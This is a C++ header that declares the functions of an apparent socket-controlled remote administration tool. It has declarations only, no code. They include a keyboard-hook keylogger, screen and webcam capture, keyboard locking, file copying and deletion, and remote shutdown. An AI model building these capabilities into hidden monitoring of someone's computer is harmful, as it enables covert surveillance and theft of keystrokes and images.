#pragma once
#include <string>

using namespace std;

string wstringToString(const wstring& wstr);

void ExportInstalledApplicationsFromRegistry(HKEY rootKey, const char* subKey, ofstream& outputFile);

void CheckSpecificApps(ofstream& outputFile);

bool ListApps();

void StartApp(SOCKET clientSocket, const string& path_app);

void CloseApp(SOCKET clientSocket, wstring& appWindowTitle);

bool ListServices();

bool FindFile(string directory, const string& search_name, string& result_path);

string Process_Path(const string& path);

bool Copy_File(const string& source, const string& destination);

bool Delete_File(const string& path);

bool CaptureScreen();

LRESULT CALLBACK LowLevelKeyboardProc_KeyLogger(int nCode, WPARAM wParam, LPARAM lParam);

void KeyLogger(int duration_seconds);

LRESULT CALLBACK LowLevelKeyboardProc_LockKeyboard(int nCode, WPARAM wParam, LPARAM lParam);

bool installKeyboardHook();

void uninstallKeyboardHook();

void LockKeyboard(SOCKET clientSocket, int durationSeconds);

void WebCamera(int duration);

bool enable_shutdown_privilege();

void RestartComputer();

void ShutDownComputer();